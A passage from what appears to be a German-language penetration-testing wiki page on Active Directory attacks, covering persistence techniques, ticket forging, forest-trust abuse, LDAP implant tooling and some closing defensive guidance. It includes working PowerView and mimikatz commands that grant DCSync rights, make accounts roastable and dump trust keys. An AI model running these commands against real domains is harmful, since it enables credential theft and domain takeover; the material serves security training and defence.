
{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Wenn **andere Benutzer** auf die **kompromittierte** Maschine **zugreifen**, ist es möglich, **Credentials aus dem Speicher zu sammeln** und sogar **Beacons in ihre Prozesse zu injizieren**, um sie zu impersonieren.\
Normalerweise greifen Benutzer per RDP auf das System zu, daher findest du hier, wie man ein paar Angriffe über fremde RDP-Sessions durchführt:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administratorpassworts** auf domänenverbundenen Computern bereit und stellt sicher, dass es **randomisiert**, eindeutig und häufig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert, und der Zugriff wird über ACLs nur für autorisierte Benutzer gesteuert. Mit ausreichenden Berechtigungen, um auf diese Passwörter zuzugreifen, wird ein Pivot auf andere Computer möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Zertifikate aus der kompromittierten Maschine zu sammeln** könnte ein Weg sein, um innerhalb der Umgebung Privilegien zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **verwundbare Templates** konfiguriert sind, ist es möglich, sie zu missbrauchen, um Privilegien zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sobald du **Domain Admin**- oder sogar besser **Enterprise Admin**-Berechtigungen hast, kannst du die **Domänen-Datenbank** **dumpen**: _ntds.dit_.

[**Weitere Informationen zum DCSync attack findest du hier**](dcsync.md).

[**Weitere Informationen dazu, wie man die NTDS.dit stiehlt, findest du hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könntest du:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer für [**ASREPRoast**](asreproast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Einem Benutzer [**DCSync**](#dcsync)-Berechtigungen gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket attack** erstellt ein **legitimes Ticket Granting Service (TGS)-Ticket** für einen bestimmten Dienst, indem der **NTLM hash** verwendet wird (zum Beispiel der **Hash des PC-Accounts**). Diese Methode wird verwendet, um auf die **Dienstberechtigungen** zuzugreifen.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ein **Golden Ticket attack** bedeutet, dass ein Angreifer Zugriff auf den **NTLM hash des krbtgt-Accounts** in einer Active Directory (AD)-Umgebung erlangt. Dieser Account ist besonders, weil er verwendet wird, um alle **Ticket Granting Tickets (TGTs)** zu signieren, die für die Authentifizierung im AD-Netzwerk essenziell sind.

Sobald der Angreifer diesen Hash erhält, kann er **TGTs** für beliebige Accounts erstellen (**Silver ticket attack**).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind wie golden tickets, jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für golden tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Zertifikate eines Accounts zu besitzen oder anfordern zu können** ist ein sehr guter Weg, um im Benutzer-Account zu persistieren (selbst wenn er das Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Die Verwendung von Zertifikaten ermöglicht es auch, mit hohen Privilegien innerhalb der Domain zu persistieren:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory stellt die Sicherheit von **privilegierten Gruppen** (wie Domain Admins und Enterprise Admins) sicher, indem es diesen Gruppen eine standardmäßige **Access Control List (ACL)** zuweist, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch missbraucht werden; wenn ein Angreifer die ACL von AdminSDHolder so ändert, dass ein normaler Benutzer Vollzugriff erhält, gewinnt dieser Benutzer weitreichende Kontrolle über alle privilegierten Gruppen. Diese Sicherheitsmaßnahme, die eigentlich schützen soll, kann also nach hinten losgehen und unberechtigten Zugriff ermöglichen, wenn sie nicht genau überwacht wird.

[**Weitere Informationen zur AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In jedem **Domain Controller (DC)** gibt es ein Konto eines **lokalen Administrators**. Wenn man Admin-Rechte auf so einer Maschine erlangt, kann der lokale Administrator-Hash mit **mimikatz** extrahiert werden. Danach ist eine Registry-Änderung nötig, um die **Verwendung dieses Passworts zu aktivieren**, wodurch Remote-Zugriff auf das lokale Administrator-Konto möglich wird.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** über bestimmte Domain-Objekte **spezielle Berechtigungen** geben, die es dem Benutzer erlauben, später **Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **Security Descriptors** werden verwendet, um die **Berechtigungen** eines **Objekts über** ein **Objekt** zu **speichern**. Wenn du nur eine **kleine Änderung** am **Security Descriptor** eines Objekts machen kannst, kannst du sehr interessante Berechtigungen über dieses Objekt erhalten, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die `dynamicObject`-Hilfsklasse, um kurzlebige Principals/GPOs/DNS-Records mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen; sie löschen sich selbst ohne Tombstones, entfernen LDAP-Evidenz und hinterlassen dabei verwaiste SIDs, kaputte `gPLink`-Verweise oder gecachte DNS-Antworten (z. B. AdminSDHolder-ACE-Verschmutzung oder bösartige `gPCFileSysPath`/AD-integrierte DNS-Weiterleitungen).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Speicher, um ein **universelles Passwort** festzulegen, das Zugriff auf alle Domain-Accounts gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Erfahre hier, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst deinen **eigenen SSP** erstellen, um die zur Anmeldung an der Maschine verwendeten **Credentials** im **Klartext** zu **erfassen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** in AD und nutzt ihn, um **Attribute zu pushen** (SIDHistory, SPNs...) auf bestimmte Objekte, **ohne** irgendwelche **Logs** bezüglich der **Änderungen** zu hinterlassen. Du **brauchst DA**-Berechtigungen und musst dich im **root domain** befinden.\
Beachte, dass bei falschen Daten ziemlich unschöne Logs auftauchen werden.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vorher haben wir darüber gesprochen, wie man Privilegien eskalieren kann, wenn man **genug Berechtigungen hat, um LAPS-Passwörter zu lesen**. Diese Passwörter können jedoch auch verwendet werden, um **Persistence aufrechtzuerhalten**.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass die **Kompromittierung einer einzelnen Domain möglicherweise dazu führen könnte, dass der gesamte Forest kompromittiert wird**.

### Basic Information

Ein [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der es einem Benutzer aus einer **Domain** ermöglicht, auf Ressourcen in einer anderen **Domain** zuzugreifen. Er erstellt im Wesentlichen eine Verknüpfung zwischen den Authentifizierungssystemen der beiden Domains, sodass Authentifizierungsprüfungen nahtlos durchfließen können. Wenn Domains einen Trust einrichten, tauschen und speichern sie bestimmte **keys** innerhalb ihrer **Domain Controllers (DCs)**, die für die Integrität des Trusts entscheidend sind.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **trusted domain** zugreifen möchte, zuerst ein spezielles Ticket anfordern, das als **inter-realm TGT** bekannt ist, von seinem eigenen Domain Controller. Dieses TGT ist mit einem gemeinsamen **key** verschlüsselt, auf den sich beide Domains geeinigt haben. Der Benutzer präsentiert dieses TGT dann dem **DC der trusted domain**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der trusted domain stellt dieser ein TGS aus und gewährt dem Benutzer Zugriff auf den Dienst.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** startet den Prozess, indem er seinen **NTLM hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert dann ein **inter-realm TGT** von DC1 an, das benötigt wird, um auf Ressourcen in **Domain 2** zuzugreifen.
4. Das inter-realm TGT ist mit einem **trust key** verschlüsselt, der zwischen DC1 und DC2 im Rahmen des zweiseitigen domain trust geteilt wird.
5. Der Client bringt das inter-realm TGT zum **Domain Controller (DC2) von Domain 2**.
6. DC2 verifiziert das inter-realm TGT mithilfe seines gemeinsamen trust key und stellt, wenn es gültig ist, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich präsentiert der Client dieses TGS dem Server, der mit dem Account-Hash des Servers verschlüsselt ist, um Zugriff auf den Dienst in Domain 2 zu erhalten.

### Different trusts

Es ist wichtig zu beachten, dass ein **Trust 1-way oder 2-way** sein kann. Bei **2-way**-Optionen vertrauen beide Domains einander, aber bei einer **1-way**-Trust-Beziehung ist eine der Domains die **trusted** und die andere die **trusting** Domain. Im letzten Fall kannst du **nur von der trusted Domain aus auf Ressourcen innerhalb der trusting Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting Domain und B die trusted Domain. Außerdem wäre dies in **Domain A** ein **Outbound trust**; und in **Domain B** ein **Inbound trust**.

**Verschiedene trusting relationships**

- **Parent-Child Trusts**: Das ist ein übliches Setup innerhalb desselben Forests, bei dem eine Child-Domain automatisch einen zweiseitigen transitive trust mit ihrer Parent-Domain hat. Im Wesentlichen bedeutet das, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child fließen können.
- **Cross-link Trusts**: Auch als "shortcut trusts" bezeichnet, werden diese zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals typischerweise bis zur Forest-Root und dann wieder hinunter zur Ziel-Domain laufen. Durch Cross-links wird dieser Weg verkürzt, was besonders in geografisch verteilten Umgebungen von Vorteil ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht zusammenhängenden Domains eingerichtet und sind naturgemäß nicht transitiv. Laut [Microsofts Dokumentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind external trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forests zuzugreifen, die nicht durch einen Forest Trust verbunden ist. Die Sicherheit wird durch SID-Filtering bei external trusts verbessert.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domain und einer neu hinzugefügten Tree-Root eingerichtet. Auch wenn sie nicht häufig vorkommen, sind Tree-root Trusts wichtig, um neue Domain Trees zu einem Forest hinzuzufügen, ihnen einen eindeutigen Domain-Namen zu ermöglichen und die zweiseitige Transitivität sicherzustellen. Weitere Informationen findest du in [Microsofts Guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist ein zweiseitiger transitive trust zwischen zwei Forest-Root-Domains und erzwingt ebenfalls SID-Filtering, um die Sicherheitsmaßnahmen zu verbessern.
- **MIT Trusts**: Diese Trusts werden mit nicht-Windows-, [RFC4120-konformen](https://tools.ietf.org/html/rfc4120) Kerberos-Domains eingerichtet. MIT Trusts sind etwas spezieller und richten sich an Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Other differences in **trusting relationships**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, also vertraut A C) oder **nicht transitiv**.
- Eine Trust-Beziehung kann als **bidirectional trust** (beide vertrauen einander) oder als **one-way trust** (nur einer vertraut dem anderen) eingerichtet werden.

### Attack Path

1. Die trusting relationships **enumerieren**
2. Prüfen, ob ein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domain** hat, vielleicht durch ACE-Einträge oder indem er in Gruppen der anderen Domain ist. Suche nach **relationships across domains** (der Trust wurde vermutlich dafür erstellt).
1. kerberoast könnte in diesem Fall eine weitere Option sein.
3. Die **Accounts kompromittieren**, die **über Domains pivoten** können.

Angreifer mit Zugriff auf Ressourcen in einer anderen Domain können dies über drei primäre Mechanismen erreichen:

- **Local Group Membership**: Principals könnten zu lokalen Gruppen auf Maschinen hinzugefügt werden, wie etwa zur Gruppe „Administrators“ auf einem Server, was ihnen erhebliche Kontrolle über diese Maschine gibt.
- **Foreign Domain Group Membership**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domain sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Umfang der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Für diejenigen, die tiefer in die Mechanik von ACLs, DACLs und ACEs eintauchen möchten, ist das Whitepaper mit dem Titel “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” eine wertvolle Ressource.

### Find external users/groups with permissions

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um Foreign Security Principals in der Domain zu finden. Das sind Benutzer/Gruppen aus **einer externen Domain/einem externen Forest**.

Du könntest das in **Bloodhound** prüfen oder mit powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Andere Möglichkeiten, Domain Trusts zu enumerieren:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 vertrauenswürdige Keys**, einen für _Child --> Parent_ und einen anderen für _Parent_ --> _Child_.\
> Du kannst den vom aktuellen Domain verwendeten mit:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escaliere als Enterprise admin zum Child/Parent-Domain, indem du die Trust mit SID-History injection missbrauchst:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Das Verständnis, wie der Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Der Configuration NC dient als zentrales Repository für Konfigurationsdaten in einer Active Directory (AD)-Forest-Umgebung. Diese Daten werden an jeden Domain Controller (DC) innerhalb des Forest repliziert, wobei beschreibbare DCs eine beschreibbare Kopie des Configuration NC vorhalten. Um dies auszunutzen, muss man **SYSTEM-Privilegien auf einem DC** haben, vorzugsweise auf einem Child-DC.

**Link GPO to root DC site**

Der Sites-Container des Configuration NC enthält Informationen über die Sites aller dem Domain beigetretenen Computer innerhalb des AD-Forest. Indem man mit SYSTEM-Privilegien auf irgendeinem DC arbeitet, können Angreifer GPOs mit den root DC sites verknüpfen. Diese Aktion kann potenziell die root domain kompromittieren, indem Richtlinien manipuliert werden, die auf diese Sites angewendet werden.

Für vertiefte Informationen kann man Research zu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) ansehen.

**Compromise any gMSA in the forest**

Ein Angriffspfad besteht darin, privilegierte gMSAs innerhalb der domain anzugreifen. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs wesentlich ist, wird im Configuration NC gespeichert. Mit SYSTEM-Privilegien auf irgendeinem DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter für jede gMSA im gesamten Forest zu berechnen.

Detaillierte Analyse und Schritt-für-Schritt-Anleitung findest du in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegierter MSA-Angriff (BadSuccessor – Missbrauch von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#ref}}

Zusätzliches externes Research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld und das Warten auf die Erstellung neuer privilegierter AD-Objekte. Mit SYSTEM-Privilegien kann ein Angreifer das AD-Schema so ändern, dass jedem Benutzer die vollständige Kontrolle über alle Klassen gewährt wird. Dies könnte zu unbefugtem Zugriff und Kontrolle über neu erstellte AD-Objekte führen.

Weiterführende Informationen gibt es unter [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS-ESC5-Schwachstelle zielt auf die Kontrolle über Public Key Infrastructure (PKI)-Objekte ab, um eine Zertifikatvorlage zu erstellen, die die Authentifizierung als jeder Benutzer innerhalb des Forest ermöglicht. Da PKI-Objekte im Configuration NC liegen, ermöglicht die Kompromittierung eines beschreibbaren Child-DC die Ausführung von ESC5-Angriffen.

Mehr Details dazu kannst du in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) lesen. In Szenarien ohne ADCS hat der Angreifer die Möglichkeit, die notwendigen Komponenten einzurichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario **wird deine Domain** von einer externen Domain vertraut, die dir **nicht näher bestimmte Berechtigungen** darüber gewährt. Du musst herausfinden, **welche Principals deiner Domain welchen Zugriff auf die externe Domain haben** und dann versuchen, dies auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario **vertraut** Ihre **Domäne** einem Principal aus **anderen Domänen** gewisse **Privilegien** an.

Wenn jedoch eine **Domäne von der vertrauenden Domäne vertraut wird**, erstellt die vertrauenswürdige Domäne einen **Benutzer** mit einem **vorhersehbaren Namen**, der das **vertrauenswürdige Passwort** als **Passwort** verwendet. Das bedeutet, dass es möglich ist, als **Benutzer aus der vertrauenden Domäne** auf die **vertrauenswürdige Domäne** zuzugreifen, um sie zu enumerieren und zu versuchen, weitere Privilegien zu eskalieren:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine andere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **entgegengesetzten Richtung** der Domänenvertrauensstellung erstellt wurde (was nicht sehr häufig ist).

Eine andere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, auf einer Maschine zu warten, auf die sich ein **Benutzer aus der vertrauenswürdigen Domäne anmelden kann**, und dies per **RDP** zu tun. Dann könnte der Angreifer Code in den Prozess der RDP-Sitzung einschleusen und von dort aus auf die **Ursprungsdomäne des Opfers** zugreifen.\
Außerdem könnte der Angreifer, wenn das **Opfer seine Festplatte gemountet** hat, aus dem Prozess der **RDP-Sitzung** heraus **Backdoors** im **Startup-Ordner der Festplatte** ablegen. Diese Technik heißt **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Abwehr von Domain-Trust-Missbrauch

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID history-Attribut über Forest Trusts hinweg ausnutzen, wird durch SID Filtering gemindert, das standardmäßig bei allen Inter-Forest Trusts aktiviert ist. Dies beruht auf der Annahme, dass Intra-Forest Trusts sicher sind, wobei der Forest und nicht die Domäne gemäß der Position von Microsoft als Sicherheitsgrenze gilt.
- Allerdings gibt es einen Haken: SID filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen, was dazu führen kann, dass es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Inter-Forest Trusts stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domänen und Server innerhalb der vertrauenden Domäne oder des Forests zugreifen können.
- Wichtig ist, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**Weitere Informationen zu Domain Trusts auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-basierter AD-Missbrauch aus On-Host-Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-ähnliche LDAP-Primitives neu als x64 Beacon Object Files, die vollständig innerhalb eines On-Host-Implants ausgeführt werden (z. B. Adaptix C2). Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` vom Beacon aus auf. Der gesamte Traffic läuft über den aktuellen Logon-Sicherheitskontext via LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischem Zertifikatsvertrauen, sodass keine socks-Proxys oder Festplattenartefakte erforderlich sind.

### LDAP-Enumeration auf Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen Kurznamen/OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` lesen beliebige Attribute aus (einschließlich Sicherheitsdeskriptoren) sowie die Forest-/Domain-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` legen Roasting-Kandidaten, Delegationseinstellungen und vorhandene [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-Deskriptoren direkt aus LDAP offen.
- `get-acl` und `get-writable --detailed` parsen die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/Attribut-Schreibzugriffe) und Vererbung aufzulisten, und liefern damit sofortige Ziele für ACL-Privilegieneskalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-Schreibprimitive für Eskalation & Persistenz

- Object-creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Maschinenkonten überall dort zu platzieren, wo OU-Rechte vorhanden sind. `add-groupmember`, `set-password`, `add-attribute`, und `set-attribute` übernehmen Ziele direkt, sobald Write-Property-Rechte gefunden wurden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, und `add-dcsync` übersetzen WriteDACL/WriteOwner auf jedem AD-Objekt in Passwort-Resets, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsprivilegien, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. `remove-*`-Gegenstücke bereinigen injizierte ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Schalter) markiert ihn für AS-REP-Roasting, ohne das Passwort anzutasten.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon aus um, ermöglichen so constrained/unconstrained/RBCD-Angriffswege und machen Remote PowerShell oder RSAT überflüssig.

### sidHistory-Injection, OU-Verschiebung und Formung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)), und ermöglicht so stealthy Zugriffserbschaft vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/OU von Computern oder Benutzern und erlaubt es einem Angreifer, Assets in OUs zu verschieben, in denen bereits delegierte Rechte existieren, bevor `set-password`, `add-groupmember` oder `add-spn` ausgenutzt werden.
- Eng begrenzte Löschbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) ermöglichen ein schnelles Rollback, nachdem der Operator Credentials oder Persistenz geerntet hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Verteidigungsmaßnahmen

[**Erfahre hier mehr darüber, wie du Credentials schützen kannst.**](../stealing-credentials/credentials-protections.md)

### **Defensive Maßnahmen zum Schutz von Credentials**

- **Domain-Admins-Einschränkungen**: Es wird empfohlen, dass sich Domain Admins nur an Domain Controllern anmelden dürfen, um ihre Nutzung auf anderen Hosts zu vermeiden.
- **Berechtigungen von Service Accounts**: Services sollten nicht mit Domain Admin (DA)-Rechten ausgeführt werden, um die Sicherheit aufrechtzuerhalten.
- **Temporäre Privilegienbegrenzung**: Für Aufgaben, die DA-Rechte erfordern, sollte deren Dauer begrenzt werden. Das kann so erreicht werden: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP-Relay-Minderung**: Prüfe Event IDs 2889/3074/3075 und setze dann LDAP Signing plus LDAPS Channel Binding auf DCs/Clients durch, um LDAP-MITM-/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasiertes Fingerprinting von Impacket-Aktivität

Wenn du gängiges AD Tradecraft erkennen willst, verlasse dich **nicht nur auf operator-kontrollierte Artefakte** wie umbenannte Binärdateien, Service-Namen, temporäre Batch-Dateien oder Ausgabe-Pfade. Erstelle Baselines dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC und WMI-Traffic aufbauen, und achte dann auf **Implementierungsbesonderheiten**, die auch dann bestehen bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` bearbeitet.

- **Standalone-Kandidaten mit hoher Konfidenz** (nach Validierung gegen deine eigene Baseline):
- Authentifiziertes DCE/RPC mit `auth_context_id = 79231 + ctx_id`
- DCE/RPC-Authentifizierungs-Padding mit `0xff` gefüllt
- LDAP-Kerberos-Binds, die ein rohes Kerberos-`AP-REQ` direkt in SPNEGO-`mechToken` platzieren
- SMB2/3-Negotiate-Requests mit ASCII-artigen `ClientGuid`-Werten
- WMI `IWbemLevel1Login::NTLMLogin` mit dem nicht standardmäßigen Namespace `//./root/cimv2`
- Hardcodierte Kerberos-Nonce-Werte
- **Besser als Korrelations-/Scoring-Features**:
- Sparse oder duplizierte Kerberos-etype-Listen, ungewöhnliche/fehlende `PA-DATA` oder TGS-REQ-etype-Reihenfolgen, die von nativem Windows abweichen
- NTLM Type 1 Messages ohne Versionsinfo oder Type 3 Messages mit null Hostnamen
- Rohes NTLMSSP in DCE/RPC statt SPNEGO, fehlende DCE/RPC-Verification-Trailer oder SPNEGO/Kerberos-OID-Mismatches
- Mehrere dieser Merkmale vom selben Host/User/Session-/Zeitfenster sind deutlich stärker als jedes einzelne schwache Feld
- **Als Anreicherung verwenden, nicht als eigenständige Alerts**:
- Standard-Dateinamen, Ausgabe-Pfade, zufällige Service-Namen, temporäre Batch-Namen, standardmäßige Computerkonto-Namen und tool-spezifische HTTP/WebDAV/RDP/MSSQL-Strings
- Diese lassen sich von Operatoren leicht ändern und eignen sich am besten, um zu erklären, warum ein cross-protocol Cluster verdächtig ist
- **Betriebliche Hinweise**:
